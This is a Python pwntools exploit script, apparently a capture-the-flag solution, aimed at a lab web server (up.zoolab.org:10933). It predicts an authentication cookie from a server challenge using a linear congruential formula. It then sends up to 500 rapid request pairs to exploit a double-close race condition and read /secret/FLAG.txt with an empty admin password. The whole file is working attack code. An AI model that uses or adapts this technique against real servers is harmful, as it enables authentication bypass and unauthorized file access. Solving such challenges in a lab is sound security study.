from pwn import *
import base64
import re

def calculate_x2(reqseed):
    # Simulate C's unsigned long long (64-bit)
    MOD = 2**64
    # Calculate x2 = reqseed * 6364136223846793005 + 1
    x2 = (reqseed * 6364136223846793005 + 1) % MOD
    # Right shift by 33 bits
    x2 >>= 33
    return x2

host = 'up.zoolab.org'
port = 10933

# Connect to the server for the initial challenge number
r = remote(host, port)
print("[+] Connected to server")

# Send the GET request to get the challenge cookie
r.sendline(b"GET /secret/FLAG.txt\r\n")

# Receive until Content-Length: 0
try:
    response = r.recvuntil(b"Content-Length: 0", timeout=2).decode(errors='replace')
    print(response)
    
    # Parse the challenge number
    match = re.search(r'challenge=(\d+)', response)
    if match:
        challenge_number = int(match.group(1))
        print(f"\n[+] Extracted challenge number: {challenge_number}\n")

        # Simulate C's unsigned long long (64-bit)
        MOD = 2**64
        # Calculate x2 = reqseed * 6364136223846793005 + 1
        x2 = (challenge_number * 6364136223846793005 + 1) % MOD
        # Right shift by 33 bits
        x2 >>= 33
        print(f"Challenge number: {challenge_number}, x2: {x2}")
    else:
        print("[-] Failed to extract challenge number.")
        exit(1)
except Exception as e:
    print(f"[-] Error: {e}")
    exit(1)

print("[+] Attempting to exploit double-close vulnerability...")

# Keep using the same connection - this is important!
# The race condition occurs within the server's thread handling
success = False
for i in range(500):
    if i % 50 == 0:
        print(f"[*] Attempt {i+1}/500")
    
    # First request: GET / to trigger file opening
    r.sendline(b"GET /\r\n")
    
    # Second request: GET /secret/FLAG.txt with auth headers
    # Note: Sending each line separately to match the original code's behavior
    r.sendline(b"GET /secret/FLAG.txt")
    auth_string = base64.b64encode(b"admin:").decode()
    r.sendline(f"Authorization: Basic {auth_string}".encode())  # admin: in base64
    r.sendline(f"Cookie: response={x2}\r\n".encode())
    
    # Try to receive data with a short timeout
    try:
        data = r.recv(timeout=0.1)
        
        # Check if we got the flag
        if b"FLAG" in data:
            print("\n[+] SUCCESS! Got the flag:")
            print(data.decode(errors='replace'))
            success = True
            
            # Save the flag to a file
            with open("flag.txt", "wb") as f:
                f.write(data)
            print("[+] Flag saved to flag.txt")
            break
    except:
        pass  # Timeout is expected most of the time

if not success:
    print("[-] Failed to get the flag after 500 attempts")

# Close the connection
r.close()